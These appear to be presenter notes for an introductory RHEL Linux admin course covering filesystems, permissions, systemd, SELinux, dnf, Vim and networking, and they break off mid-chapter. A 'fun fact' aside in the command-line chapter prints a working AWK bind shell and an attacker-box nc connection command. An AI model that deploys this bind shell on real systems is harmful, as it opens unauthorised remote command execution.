GLOSSARY/OVERVIEW:

## 🗂️ **Course Flow / Syllabus**

## 🔰 1. Welcome & Orientation (5 min)

- What this session _is_: foundational Linux admin fluency
    
- What this _isn’t_: distro-specific, deep DevOps, or kernel-hacking
    
- Tips for playing along safely in VMs or SSH sessions later
    

## 📁 2. Filesystem Structure (10 min)

- Explain Linux hierarchy (FHS): why it’s different from Windows
    
- Tour key dirs: `/etc`, `/var`, `/home`, `/usr`, `/opt`, `/tmp`, `/dev`, `/proc`
    
- Commands: `ls`, `tree`, `df -h`, `du -sh *`
    
- **Safe demo:** read-only walkthrough of real server `/` with commentary
    

## ⚙️ 3. Init Systems & Services (10 min)

- systemd: units, targets, dependencies
    
- `systemctl` 101: check, enable, restart services
    
- Logs with `journalctl`
    
- **Demo:** Read logs from `sshd`, explain `failed`, `active`, `enabled`
    

## 💻 4. Core Command Line Usage (10 min)

- Files: `cp`, `mv`, `rm`, `touch`, `mkdir`
    
- Navigation: `cd`, `pwd`, `find`, `locate`, `stat`
    
- Power tools: `grep`, `less`, `tail -f`, `awk`
    
- **Demo:** Show live filtering logs with `grep`, using `find` to locate files
    

## 🔒 5. SELinux Basics (5 min)

- Why SELinux exists
    
- Modes (`getenforce`, `setenforce`)
    
- Quick look at contexts
    
- **No live break/fix**, but explain: `audit2why`, `restorecon`, and “why your config is working but nothing’s working"
    

## 📦 6. Package Management (5 min)

- RPM vs DEB: RHEL vs Debian-based systems
    
- Commands: `dnf`, `yum`, `apt`
    
- Install, remove, update software safely
    
- **Demo:** Show a dry-run install, e.g., `dnf info htop`, no actual install
    

## ✍️ 7. Vim Crash Course (5–7 min)

- Modes: Normal, Insert, Command
    
- Open → Edit → Save → Exit (`i`, `ESC`, `:wq`)
    
- Vim is everywhere: config files, crontabs
    
- **Demo:** Open a dummy config and edit in Vim (don't save)
    

## 🌐 8. Networking & Firewalls (10 min)

- IP and DNS: `ip`, `nmcli`, `dig`, `ss`, `curl`
    
- Firewalld zones concept
    
- **Demo:** Show `ip a`, `nmcli connection show`, `firewall-cmd --list-all`
    

## 👥 9. Users, Groups, and Permissions (8 min)

- User management: `useradd`, `passwd`, `groupadd`
    
- Permissions: `chmod`, `chown`, `umask`
    
- Why sudo matters
    
- **Demo:** Inspect users and permissions on real files
    

## 🩵 10. Logs & Troubleshooting (8 min)

- Logging systems: rsyslog, journald
    
- Key logs: `/var/log/messages`, `secure`, `dmesg`
    
- **Demo:** Trace a failed `sudo` or login with `journalctl` filters


# 🔰 1. Welcome & Orientation (5 min)

![[Pasted image 20250520192646.png]]

  

	**"You don’t need to be a sysadmin, but you do need to know your way around a Linux box. That’s what this session is for."**
	
	  
	
## **1.1 🎯 Purpose of the Session (1–2 min)
	
	  
	
		“Today we’re building practical Linux fluency—focused on RHEL-based enterprise systems, like what you see in prod VMs, development environments, and automation pipelines.”
		
		  
		
		This session is for:
		
		  
		
		- Developers, analysts, and engineers who touch Linux occasionally. ( have just enought sillyness in you to wanna play around)
		
		  
		
		- Admins new to RHEL or those who want a firmer foundation
		
		  
		
		- People who’ve broken stuff on Linux before and want to understand why 😅
		
		  
		
		- Anyone who’s ever typed sudo and prayed
		
		  
		
		Goal:
		
		You’ll leave with a real mental model of how Linux works, what’s where, why things break, and how to investigate confidently without making things worse.
		
	  

##1.2 🚫 What This Session Isn’t (1 min)
	  
	
	❌ Not distro-hopping: this is RHEL/CentOS/Rocky-focused
	
	(Yes, Ubuntu has apt, yes it has /etc, but the default layout, firewalld, SELinux, LVM, etc. are RHEL-native and that’s what matters here. We are here to build stuff that secretly runs the world and silently code daemons from the shadows)
	
	  
	
	❌ Not DevOps: we’re not covering container orchestration, Ansible playbooks, or CI/CD pipelines today.
	
	  
	
	“This is the bare metal, SSH-in-and-fix-it side of Linux.”
	
	  
	
	❌ Not kernel-deep: no kernel module writing, stack traces, or hardware driver hell.
	
	  
	
	This session is designed to support real-world troubleshooting, daily system navigation, and communications accross teams.
	
	  
	
## 1.3 🛡️ Safe Participation Tips (1 min)
	
	  
	
	You’re welcome to follow along on your own VM or lab box, but:
	
	  
	
	Use a non-prod, non-critical system (e.g., a Rocky Linux VM, RHEL trial VM, or a cloud sandbox)
	
	  
	
	**“You’ll get more out of this if you take notes, ask questions, and try the commands on your own later—ideally on a VM you can break and restore. I have NO EGO, NO PRIDE AND I love questions”**
	
	  
	
	##1.4 📬 Optional Housekeeping (0.5–1 min)
	
	  
	
	Slides/recording will be available afterward
	
	  
	
	Cheat sheet and GitHub repo/Markdown notes available
	
	  


# **📁 2. Filesystem Structure (10–12 min)**

  ![[Pasted image 20250520190548.png]]

**"Where everything lives, why it lives there, and how Red Hat organizes it for scale and control"**

  

🧱 2.1. The Philosophy

  

	Linux follows the FHS (Filesystem Hierarchy Standard): everything is either a file or a process.
	
	  
	
	Unlike Windows, no separate C:\ drive—just one unified tree starting at / (root).
	
	  
	
	It’s modular and composable: you can mount any device anywhere.
	
	  
	
	Enterprise distros like RHEL separate concerns for automation, backups, and scaling.

  

📂 2.2. Critical Directories You Must Know

	Directory Purpose
	
		/etc Config files for everything on the system (no binaries!)
		
		/var Variable data: logs, mail, spool files. Grows fast.
		
		/home User directories. Usually on a separate logical volume or NFS.
		
		/usr Read-only OS software, shared libraries, utilities
		
		/opt Third-party apps (e.g., Oracle, backup agents)
		
		/tmp Temporary files. Cleared on reboot. Watch for disk abuse here.
		
		/dev Pseudo-devices. ls /dev/sd* shows block devices like drives
		
		/proc Virtual filesystem. Kernel exposes runtime info here (cat /proc/cpuinfo)

  ## 3.1 ls -la Output Breakdown

When you run:

```bash
ls -la
```
You'll see something like:
```
-rw-r--r--  1 john  devs   4096 May 20 12:00 example.txt
```


What each column means:

| What         | What it means                                                                                                                                                    |     |
| ------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| -rw-r--r--   | filetype + Permissions. Explained below. Gets complex                                                                                                            |     |
| 1            | Link count (usually 1 unless hard-linked (fancy symlink thing that doesnt die if you delete the file. Like 2 heads. One hydra 2 filenaimes point to same inode)) |     |
| john         | File owner (user)                                                                                                                                                |     |
| devs         | Group the file belongs to                                                                                                                                        |     |
| 4096         | File size in bytes                                                                                                                                               |     |
| May 20 12:00 | Last modified time                                                                                                                                               |     |
| example.txt  | File name                                                                                                                                                        |     |

2.3 File Types and Permission Bits
The first 10 characters of the line represent the file type and access permissions.

-rw-r--r--

This breaks down into:

[TYPE][User][Group][Other]

    Position 1 (File type):

        - → regular file

        d → directory

        l → symbolic link

        c, b → special device files

    Positions 2–4 (User permissions)

    Positions 5–7 (Group permissions)

    Positions 8–10 (Other/world permissions)

Each set uses:

    r = read

    w = write

    x = execute

    - = no permission

Common Examples
	Permission	Meaning
	-rw-r--r--	Owner can read/write, group can read, others can read
	-rwxr-xr--	Owner: all, group: read/execute, others: read
	drwxr-xr-x	Directory with full access for owner, read/execute for others

2.4 Users and Groups

Each file belongs to:

    A user (the owner)

    A group (a collection of users)

Check your identity:

	whoami
	groups

Change ownership:

	chown username:groupname filename
	
	Example:
	
	chown alice:devs script.sh
	
	3.4 Modifying Permissions with chmod
	Symbolic Mode:
	
	chmod u+x script.sh      # Add execute to the user
	chmod g-w file.txt       # Remove write from group
	chmod o+r file.txt       # Add read for others

	Octal Mode:

	Each permission bit has a numeric value:
	Permission	Binary	Value
	r	100	4
	w	010	2
	x	001	1
	
	So:
	Octal	Meaning
	7	rwx
	6	rw-
	5	r-x
	4	r--
	0	---
	
	Examples:
	
	chmod 644 file.txt    # -rw-r--r--
	chmod 755 script.sh   # -rwxr-xr-x
	chmod 700 secrets.txt # -rwx------

2.5 Bonus: Special Bits (Sticky, SUID, SGID)

Sometimes you’ll see extra letters in permission strings, like t or s.
Sticky Bit (t)

    Common on /tmp

    Prevents users from deleting files they don’t own in world-writable directories

drwxrwxrwt 10 root root 4096 May 20  /tmp

SUID (s on user exec bit)

    Runs the program as the file owner, not the user launching it

SGID (s on group exec bit)

    Runs the program with group privileges or assigns group ownership to new files in a directory

2.6 Real-World Advice

    Avoid 777 unless it’s /tmp and even then, think twice

    Watch out for world-writable files (-rw-rw-rw-) — they are usually bad news

    Use chmod with intention — don’t just copy/paste what StackOverflow says

    "Permissions are not just about access — they’re about boundaries, risk, and control. Don’t treat them casually."
    
# Chapter 3: Core Command Line Usage – How to actually do stuff


![[Pasted image 20250520185108.png]]
_"You either die a GUI user, or live long enough to learn grep."_  
— (not exactly Harvey Dent, but close enough)

---

## 3.1 File Operations: Create, Copy, Move, Destroy

| Command | Description                              | Example                  |
| ------- | ---------------------------------------- | ------------------------ |
| `cp`    | Copy files or directories                | `cp file1.txt backup/`   |
| `mv`    | Move or rename files                     | `mv draft.txt final.txt` |
| `rm`    | Remove files or directories              | `rm old.log`             |
| `touch` | Create an empty file or update timestamp | `touch newfile.txt`      |
| `mkdir` | Make a new directory                     | `mkdir /opt/data`        |

> ⚠️ *Use `rm` with respect. It’s the “fireball” of the shell: powerful, dangerous, and often irreversible.*

---

## 3.2 Navigation Commands: Find Yourself in the Void

| Command  | Description                                        | Example                    |
| -------- | -------------------------------------------------- | -------------------------- |
| `cd`     | Change directory                                   | `cd /var/log`              |
| `pwd`    | Print working directory                            | `pwd`                      |
| `find`   | Recursively locate files by name/size/date/etc.    | `find /etc -name "*.conf"` |
| `locate` | Lightning-fast file search (uses a prebuilt index) | `locate nginx.conf`        |
| `stat`   | Display detailed file metadata                     | `stat /etc/passwd`         |

---

## 3.3 Power Tools: Grep, Less, and the Log-Wranglers

| Command   | Description                                                           | Example                            |
| --------- | --------------------------------------------------------------------- | ---------------------------------- |
| `grep`    | Search inside files or command output                                 | `grep ERROR /var/log/messages`     |
| `less`    | Scroll through large files page-by-page                               | `less /var/log/secure`             |
| `tail -f` | Live-follow the end of a file (great for logs)                        | `tail -f /var/log/audit/audit.log` |
| `awk`     | Field-based text parsing (GET ME WHAT I WANT. I dont wanna see fluff) | `awk '{print $1}' /etc/passwd`     |

> 🧠 *“Logs are like tea leaves. `grep` is how we read the flavor of catastrophe.”*



File Hunting:
	find /etc -name "*logrotate*"
	locate bashrc
	
Check file metadata:
	stat /etc/hosts


## 😈 Fun Fact: AWK Is Turing Complete; and Slightly Dangerous

AWK isn’t just for slicing CSVs. It’s actually **Turing complete**, meaning you could (in theory) write an entire operating system in it. (Please don’t.)

But just to prove a point, here’s a **non-interactive bind shell** written entirely in AWK.

### 🔥 What It Does:
	Binds a TCP port and allows remote command execution over the network.

### 🧪 To test it:
On your attacker box:
```bash
nc target.com 12345

- Run `nc target.com 12345` on the attacker box to connect to the shell.
    
    ```

Lil snippet for the target
``` bash
    LPORT=12345
    awk -v LPORT=$LPORT 'BEGIN {
        s = "/inet/tcp/" LPORT "/0/0";
        while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
        while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
    ```

---
More info: https://gtfobins.github.io/gtfobins/awk/ (spicy fun awk stuff, no i didnt write that bind shell, its from gtfo bins, a good place for offensive sec stuff)

## 3.4 Live Demo Suggestions

Show these **non-destructive, practical one-liners**:

- **Log analysis:**
  ```bash
  grep "sshd" /var/log/secure
  tail -f /var/log/messages


```

xsX

# 📦 3. LVM – Why It Exists and Where It Shows Up

  

RHEL installs use LVM (Logical Volume Manager) by default.

  

Why? Flexibility. You can resize volumes live, take snapshots, and separate concerns.


The classic layout you’ll see:



LVM hierarchy:
![[Pasted image 20250520171937.png]]
  

Physical Volume (/dev/sda2) 
	→ Volume Group (rhel) 
		→ Logical Volumes (rhel-root, rhel-home, etc)

  

Inspect it:

  

	lsblk
	
	vgs
	
	lvs

  

🧪 3.4. Safe Demo (Read-Only)

  

SSH into a RHEL box or VM (real or lab), no sudo needed:

  

ls /

  

	- Lists files and directories in the root (/) directory
	
	  
	
	- Fast way to get a feel for the top-level Linux layout
	
	  
	
	- Shows entries like /etc, /var, /home, etc.
	
	  
	
	- Think of it as: “What’s at the very top of the filesystem?”

  

tree -L 1 /

  

	- Displays the directory tree of /, limited to 1 level deep
	
	  
	
	- Helps visualize folder structure hierarchically
	
	  
	
	- Easier than mentally parsing a long ls output
	
	  
	
	- Use -L 2 or -L 3 to go deeper (but be careful—this explodes fast)

  

df -h

  

	- Shows disk space usage per mounted filesystem
	
	  
	
	- -h means human-readable (e.g., shows 10G instead of 10737418240)
	
	  
	
	- Lets you see which mounts (like /, /boot, /home) are filling up

  

	Common flags:

  

		df -T → also shows filesystem type (ext4, xfs, etc.)

  


lsblk

  

	- Lists all block devices and how they’re mounted
	
	  
	
	- Clean visual map of physical disks (/dev/sda) and partitions/LVs
	
	  
	
	- Shows which devices are used for /, /home, etc.
	
	  
	
	- Output includes:
	
	  
	
	- NAME (e.g., sda, sda1)

  

|      |                           |                                                   |
| ---- | ------------------------- | ------------------------------------------------- |
| SIZE | TYPE (disk, part, or lvm) | MOUNTPOINT (where it’s mounted in the filesystem) |


vgs

![[Pasted image 20250520173754.png]]


  ## 📖 **What Each Column Means**

| **Column** | **Meaning**                                                                                                                                                                                                                                                                                                                                   |
| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **VG**     | The name of the Volume Group (VG) – a named storage pool created from one or more Physical Volumes (PVs)                                                                                                                                                                                                                                      |
| **#PV**    | Number of **Physical Volumes** (e.g., partitions or disks) that make up the VG                                                                                                                                                                                                                                                                |
| **#LV**    | Number of **Logical Volumes** inside the VG                                                                                                                                                                                                                                                                                                   |
| **#SN**    | Number of **Snapshots** present                                                                                                                                                                                                                                                                                                               |
| **Attr**   | Attributes:   - `w` = writeable<br>    <br>- `z` = resized metadata<br>    <br>- `--` = no mirror, no snapshot<br>    <br>- `n` = normal allocation policy \|  <br>    \| **VSize** \| Total size of the Volume Group (across all PVs) \|  <br>    \| **VFree** \| Free space left in the Volume Group (available for new or extended LVs) \| |
| VSize      | Size of the VG across all LVs                                                                                                                                                                                                                                                                                                                 |
| VFree      | Size avail to expand it into                                                                                                                                                                                                                                                                                                                  |
	Attr = [1][2][3][4][5][6]
	         |  |  |  |  | 
	         |  |  |  |  └─ Allocation policy
	         |  |  |  └──── Clustered or not
	         |  |  └──────– Exported or not
	         |  └────────–– Resizeable metadata
	         └────────––– Write access
	
	🧾 Position-by-Position Guide
	Position	Meaning	Possible Values	Explanation
	[1]	Write Access	w = writeable
	r = read-only
	d = read-only due to metadata problems	Indicates if the VG is usable for writes
	[2]	Resizable Metadata	z = resizing allowed
	- = not resizable	Shows if the VG metadata can be resized
	[3]	VG Exported	x = exported (won’t be auto-activated)
	- = normal	Used when moving VGs between systems
	[4]	VG Clustered	c = clustered VG
	- = not clustered	Used in HA environments or cluster setups
	[5]	Shared	
		s = shared VG ... Very rare, only in advanced cluster configs
		- = not shared	
	[6]	Allocation Policy	
		n = normal
		c = contiguous
		a = anywhere
		i = inherit	How new extents are allocated inside this VG
	
	Shows Volume Groups in LVM

  

Useful for seeing:

  

VG name (e.g., rhel)

  

Total size, free space, how many LVs/PVs are in the group

  

If you see a VG with lots of free space, you could extend LVs

  

lvs

  

Lists Logical Volumes in LVM

  

Shows:

  

LV names (e.g., rhel-root, rhel-home)

  

Their size and what VG they belong to

  

You can correlate this with lsblk to map which LV is mounted where

  

Show how:

  

/home is a separate LV → makes backups easy and damage isolated

  

/var is its own LV → so logs or a mail spool can’t fill root and kill the system

  

Use lsblk to point out the underlying /dev/mapper/rhel- logical volumes*

  

Mention that LVs can span multiple physical drives (unlike partitions)

  
  

🛠️ 3.5. Admin Insight Commentary

  

“When a box is running out of space in /var but has free space in the VG? You can extend it live. Welcome to real Linux.”

  

“Ever had an app crash a system by filling /tmp? That’s why we mount it separately.”

  

Mention RHEL hardening often mounts dirs like /var/log with noexec or nodev flags
     ### `noexec` and `nodev`
	
	These are **mount flags** you can set in `/etc/fstab` or apply temporarily with `mount -o`, used to restrict what can happen in certain directories.
	
	---
	
### 🚫 `noexec` — **No Executables Allowed**
	
	- **What it does:**  
	    Prevents executing **binary programs** from the mounted filesystem.
	    
	- **Why it matters:**  
	    Stops attackers from **uploading and executing malicious binaries** in places like `/tmp`, `/var`, or user-mounted USB drives.
	    
	- **Example:**  
	    If `/tmp` is mounted with `noexec`, then running:
### 🚫 `nodev` — **No Device Files**

- **What it does:**  
    Prevents the creation or usage of **device special files** (like `/dev/sda`, `/dev/null`) in that mount.
    
- **Why it matters:**  
    Stops a non-root user from mounting a filesystem (like a USB drive) and trying to create a fake block device that could let them **bypass controls or read raw disks**.
    
- **Best for:** anything user-accessible — `/home`, `/tmp`, `/mnt`, external filesystems

 Chapter 3: File Permissions, Ownership, and RWX in Linux

Understanding Linux file permissions is essential for managing access, securing systems, and troubleshooting weird behavior. This chapter breaks down what you see in `ls -la`, how to interpret permissions, and how to safely modify them.

---


# ⚙️ **4. Init Systems & Services**

_"Who starts your services, keeps them alive, logs their death, and cleans up the mess when they crash? That’s the init system."_

![[systemd.png]]
# Unlike the Doomslayer, Init systems SPAWN daemons and kills orphans.... 
In any other place, youd probably run from it.
--



🧠 Zombie: process with no parent, stuck in process table  
👻 Orphan: lost its parent, reparented to PID 1 (systemd)  
🔥 Daemon: long-lived background service

### 🧠 **What is an Init System?**

- The **init system** is the **first userspace process** started by the kernel (`PID 1`) after boot. (AKA INIT SYSTEMS ARE AWESOME THEY KILL ZOMBIES AND SPAWN DAEMONS!!)
    
- Its job: **start and manage services**, set up your environment, and **keep critical daemons alive**.
    
- It also:
    
    - Spawns and tracks long-lived system processes (daemons)
        
    - **Reaps zombie/orphaned processes**
        
    - Determines **what services start, in what order, and under what conditions**
        

---

### 💥 **Why systemd?**

- `systemd` is the default init system in RHEL 7+ (and most modern distros)
    
- Replaced older `SysVinit` and `Upstart`
    
- It’s fast, parallelized, modular, and deeply integrated into RHEL
    

---

## 🛠️ **How systemd Works**

### 🔗 4.1**1. Units**

- Everything is a **unit** in `systemd`
    
- Units describe **what** to start and **how** to manage it
    
- Types of unit files:
    
    - `.service` → system services (e.g., `sshd.service`)
        
    - `.socket` → socket activation (e.g., start service when traffic hits a port)
        
    - `.target` → logical group of units (like runlevels)
        
    - `.mount` → mount points
        
    - `.timer` → cron-like scheduled units


Unit files are stored in:
	/usr/lib/systemd/system/      ← packaged services
	/etc/systemd/system/          ← local overrides/custom services

### 🎯 **4.2. Targets (the new runlevels)**

- A **target** is a named group of units meant to be reached at a system state
    
- Examples:
    
    - `multi-user.target` → non-GUI, multi-user mode (like old runlevel 3)
        
    - `graphical.target` → boots to GUI (like runlevel 5)
        
    - `rescue.target` → single-user repair mode
- ![[Pasted image 20250520181547.png]]


In the server world.. Only muggles use GUIs. Youll probably never see runlevel 5 on a server.

### 🔁 **4.3 Dependencies**

- systemd understands complex **unit relationships**
    
- You can define:
    
    - `Requires=` → must also be active
        
    - `After=` → must start after another service
        
    - `Wants=` → optional dependencies
        
- Example: `nginx.service` might require `network-online.target` before starting
    

---

## 🚀 **Practical systemctl Usage (Core Admin Stuff)**

| **Command**                           | **What it does**                             |
| ------------------------------------- | -------------------------------------------- |
| `systemctl status sshd`               | Show current state, recent logs, PID, uptime |
| `systemctl start sshd`                | Start the service now                        |
| `systemctl stop sshd`                 | Stop it now                                  |
| `systemctl enable sshd`               | Start it **on boot**                         |
| `systemctl disable sshd`              | Don’t start on boot                          |
| `systemctl restart sshd`              | Stop and start                               |
| `systemctl reload sshd`               | Reload config without restart (if supported) |
| `systemctl is-enabled sshd`           | Shows if it starts at boot                   |
## 📜 **systemd Unit File Anatomy (for .service files)**

Example: `/usr/lib/systemd/system/httpd.service`
```
[Unit]
Description=Apache Web Server
After=network.target

[Service]
Type=notify
ExecStart=/usr/sbin/httpd -DFOREGROUND
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target

```


### 🧩 Breakdown:

- **[Unit]** → metadata and dependencies
    
- **[Service]** → how to run, stop, and restart
    
- **[Install]** → what target this links to when you `enable` it
    

---

## 📜 **journalctl Basics (Log Everything PID 1 Sees)**

- `systemd` **captures logs** from all services using `journald`
    
- Use `journalctl` to view and filter
    

### Core commands:
journalctl -u sshd           # Logs for just sshd
journalctl -xe               # Show recent errors/warnings
journalctl --since today     # Filter by time
journalctl -b -1             # Logs from previous boot


🧪 **Live Demo (Safe, Read-Only)**

	systemctl status sshd
	systemctl is-enabled sshd
	journalctl -u sshd --since today

**Explain:**

- `active (running)` → the service is up
    
- `enabled` → it’s set to start at boot
    
- If it failed, `systemctl status` and `journalctl -xe` will show logs and errors


### 🧠 Admin Real Talk:

- If a service won’t start, check its unit file and journal logs
    
- If `systemctl says “Active: failed”`, don’t just restart it  **figure out why** WHat might you run/do?
    
- **Don’t edit unit files in `/usr/lib/systemd/`** — use overrides in `/etc/systemd/system/` or run `systemctl edit servicename`
- Now.. Would I be sour if you chmod 777 a unit file for the shiny new service you made?



# Chapter 5: SELinux Basics – Security That Breaks Everything Until You Learn It

![[Pasted image 20250520191448.png]]

> _"Your config is fine. It’s just SELinux being SELinux."_  
> — Every sysadmin, at least once

---

## 🔒 5.1 Why SELinux Exists

- **SELinux** (Security-Enhanced Linux) is a **mandatory access control (MAC)** system built into RHEL.
- It adds **fine-grained security rules** on top of file permissions.
- Think of it as:  
  > “Even if `nginx` has permission to read the file… **SELinux might still say no** because `nginx` isn't *authorized* to access that type of file.”

### 🧠 TL;DR:
> **Discretionary Access Control (DAC)** = file permissions (rw-r--r--)  
> **Mandatory Access Control (MAC)** = SELinux (you must have *label-level* permission too)

---

## 🧭 5.2 SELinux Modes

```bash
getenforce        # Shows current mode
setenforce 0      # Switch to permissive (temporary, runtime only)

```

| Mode       | Meaning                                                           |
| ---------- | ----------------------------------------------------------------- |
| Enforcing  | SELinux is active and enforcing rules                             |
| Permissive | Logs violations, but does not block (great for testing/debugging) |
| Disabled   | SELinux is completely off (requires reboot and config change)     |


To permanently set the mode, edit:

/etc/selinux/config

## 🏷️ 5.3 SELinux Contexts

Every file, process, and port has a security context, which looks like:

```
-rw-r--r--. root root system_u:object_r:httpd_sys_content_t:s0 index.html
```


Context breakdown:

| Field  | Description                        |
| ------ | ---------------------------------- |
| user   | SELinux user (usually system_u)    |
| role   | Usually object_r for files         |
| type   | Most important — determines access |
| level	 | Usually s0; used in MLS (rare)     |

Useful commands:

ls -Z               # Show SELinux context of files
ps -eZ              # Show context of running processes
semanage fcontext   # Manage default file contexts
restorecon -Rv /dir # Restore default context

🛠️ 6.4 Common Troubleshooting Tools

audit2why

Takes log entries from /var/log/audit/audit.log and explains why something was denied.

cat /var/log/audit/audit.log | audit2why

    "Why won’t Apache read this file? audit2why knows."

restorecon

Restores a file's context to what it should be based on policy.

restorecon -v /var/www/html/index.html

    Great when you copied a file and it magically stopped working? That’s SELinux context mismatch.

⚠️ 6.5 The Classic Problem

Your config is perfect. Permissions are correct. Firewall is open.
But the service still fails to access a file or bind to a port?

✅ Check SELinux:

	getenforce
	ls -Z file

✅ If in doubt:

	audit2why
	restorecon


	## 🛠️ Creating and Applying a Custom SELinux Policy Module

Sometimes SELinux blocks legitimate actions your service needs to perform. Instead of disabling SELinux, you can create a **custom policy module** to allow the specific behavior.

### 🔍 Step 1: Extract Denied Actions from the Audit Log
```bash
grep "avc:  denied" /var/log/audit/audit.log > denied.log
```
🧙 Step 2: Generate a Policy Module

```bash
audit2allow -M my_policy < denied.log
```

This creates:

    - my_policy.te → human-readable policy source

    - my_policy.pp → compiled policy module (binary)

✅ Step 3: Install the Policy Module

 ```bash
 semodule -i my_policy.pp
```

The changes take effect immediately.

⚠️ Pro Tips

    Always read the .te file to make sure you’re not allowing something risky.

    Often, SELinux denials are caused by mislabeled files — fix those with:

restorecon -Rv /path/to/problem

    "SELinux blocks what’s broken, but also what’s dangerous. Write custom policies wisely."

💡 Real Talk

    Don’t just disable SELinux because “it’s annoying”

    Learn to live with it, or set to permissive while testing
	    1) sudo getenforce
	    2) sudo setenforce 0
	    3) see if it works. If it does check audit2why
	    4) sudo setenforce 1 #Set it back to enforcing
	    5) sudo getenforce

    It actually protects you when something gets compromised

    "SELinux: the thing that broke your config — and also stopped a 0-day."


# 📦 Chapter 6: Package Management – Installing Software Like an Admin

> ![[Pasted image 20250520195323.png]]
> 
> _“In Linux, software doesn’t come from websites — it comes from the system itself.”_

When you need to install software on a Linux server, you don’t go download an installer  you use a **package manager**. This is cleaner, safer, and much easier to automate. Its like an app store for nerds.

---

## 6.1 RPM vs DEB (Know Your Ecosystem)

There are two major families of Linux package formats:

| Format | Used By                         | Tools                    |
|--------|----------------------------------|---------------------------|
| RPM    | RHEL, CentOS, Rocky, Fedora     | `dnf`, `yum`, `rpm`      |
| DEB    | Debian, Ubuntu                  | `apt`, `dpkg`            |

> Since we’re focused on **RHEL**, we’ll use `dnf` (or its legacy version `yum`).

---

## 6.2 `dnf` Basics (Dandified Yum)

### 🛠️ Common Commands

| Command                     | What It Does                          |
|-----------------------------|----------------------------------------|
| `dnf install <pkg>`         | Installs a package                     |
| `dnf remove <pkg>`          | Uninstalls a package                   |
| `dnf update`                | Updates all packages                   |
| `dnf info <pkg>`            | Shows package metadata (safe!)         |
| `dnf search <term>`         | Searches for packages by keyword       |
| `dnf list installed`        | Lists installed packages               |
| `dnf check-update`          | Shows what updates are available       |
| `dnf history`               | Shows your transaction history         |

---

## 6.3 Example: Safe Dry-Run

We don’t want to install anything during the demo — just demonstrate what *would* happen.

```bash
dnf info htop
```

### 🔒 Bonus: How to Search
``` bash
	dnf search nginx
```



> Useful if you don’t remember the exact package name. Just grep it.

---

## 6.4 Where Packages Come From

RHEL packages come from **enabled repositories**:

- Defined in: `/etc/yum.repos.d/`
    
- Can include:
    
    - Official Red Hat repos
        
    - EPEL (Extra Packages for Enterprise Linux)
        
    - Internal mirrors or satellite servers
        

You can list them with:
```bash
dnf repolist
```


## 6.5 RPM vs DNF

Under the hood, `dnf` uses **RPM packages**. You can interact directly with them:
rpm -q <pkg>            # Is this package installed?
rpm -ql <pkg>           # What files did it install?
rpm -qi <pkg>           # Package info
rpm -e <pkg>            # Remove (use with care)


But generally, stick to  dnf it handles dependencies, repositories, and transactions better.


## 7.6 Real-World Advice

- Don't just `curl | bash`. Use the package manager.
    
- **Avoid using `--nogpgcheck`** unless you know exactly what you're doing.
    
- Want bleeding-edge software? Look into **EPEL**, **modular streams**, or building your own `.rpm`.

## 🧪 Demo Suggestion

Show these in read-only/safe mode:

`dnf info htop`
`dnf search nginx`
`dnf list installed | grep ssh`
`dnf repolist`

“DNF doesn’t just install software; it handles everything that software depends on, secures it, and logs it. Don’t fight the package manager.”


# ✍️ Chapter 7: Vim Basics – Escape the Insert Trap and Love It

![[0_6uiN7vsj4jqoBWAW.jpg]]

> _“You don’t learn Vim because it’s easy — you learn it because it’s everywhere.”_

Vim is installed on **basically every Linux system**, including minimal installs, rescue modes, containers, and ancient headless boxes. Even if you prefer a different editor, **knowing Vim is essential** to survive in the shell.

---

## 7.1 Why Vim Is Worth Learning

- It's available **even when nothing else is**.
- It's **blazing fast** once you know it.
- It’s used for:
  - Quick edits (`sudo vim /etc/sshd_config`)
  - Cron jobs (`crontab -e`)
  - Rescue shell situations
  - Git commit messages
- You don’t need to master it — just **learn enough to edit a file and escape** 😅

---

## 7.2 Modes: Vim’s Big Idea

Vim is **modal** — it has different modes for different tasks.

| Mode      | What it does                          | How to enter                        |
|-----------|----------------------------------------|-------------------------------------|
| **Normal**| Default mode: move around, delete, copy | Press `ESC`                         |
| **Insert**| Text input mode                         | Press `i`, `a`, or `o`              |
| **Visual**| Highlight and select text               | Press `v` (character) or `V` (line) |
| **Command**| Run commands like `:wq` or `:set`       | Press `:` while in Normal mode      |

---

## 7.3 Essential Commands to Survive

### 🧭 Navigation (in Normal mode):
| Command | Action                |
|---------|------------------------|
| `h`     | move left              |
| `l`     | move right             |
| `j`     | move down              |
| `k`     | move up                |
| `gg`    | go to top of file      |
| `G`     | go to bottom           |
| `w`     | jump forward a word    |
| `b`     | jump back a word       |

---

### ✍️ Editing:
| Command     | Action                        |
|-------------|-------------------------------|
| `i`         | insert before cursor          |
| `a`         | append after cursor           |
| `o`         | open new line below           |
| `dd`        | delete line                   |
| `yy`        | yank (copy) line              |
| `p`         | paste                         |
| `u`         | undo                          |
| `Ctrl-r`    | redo                          |

---

### 🔍 Searching and Saving:
| Command      | Action                          |
|--------------|----------------------------------|
| `/text`      | search for "text"               |
| `n` / `N`    | next/prev match                 |
| `:w`         | write (save) the file           |
| `:q`         | quit                            |
| `:wq` or `ZZ`| save and quit                   |
| `:q!`        | quit without saving (force)     |

---

## 7.4 Buffers, Windows, and Syntax Goodness

| Feature      | Description                                     |
|--------------|-------------------------------------------------|
| **Buffers**  | Open multiple files with `:e` and `:bn`, `:bp`  |
| **Splits**   | View/edit multiple files at once: `:split`, `:vsplit` |
| **Syntax**   | Enable colors with: `:syntax on`                |
| **Line numbers** | `:set number`                             |

---

## 🧪 Demo: Practice Editing a Config File

Walk through:

```bash
vim /etc/ssh/sshd_config

- Search for a line:  
    `/PermitRootLogin`
    
- Change `yes` to `no`:
    
    - Move to it
        
    - Press `i`, edit, `ESC`
        
- Save & exit: wq
```


# 🌐 Chapter 8: Networking & Firewalls – Know Your Packets

> _"If you can't ping it, you can't debug it."_  
> – Every Linux admin ever

Linux gives you powerful low-level tools to manage and troubleshoot networking — no GUI needed. This chapter covers IP configuration, DNS lookups, and firewall zones using enterprise-relevant tools.

---

## 9.1 IP Addresses and Interfaces

To check your interfaces and IP addresses:

```bash
ip a
```

You'll see something like

```
:2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.1.50/24 brd 192.168.1.255 scope global dynamic ens192
```


This tells you:
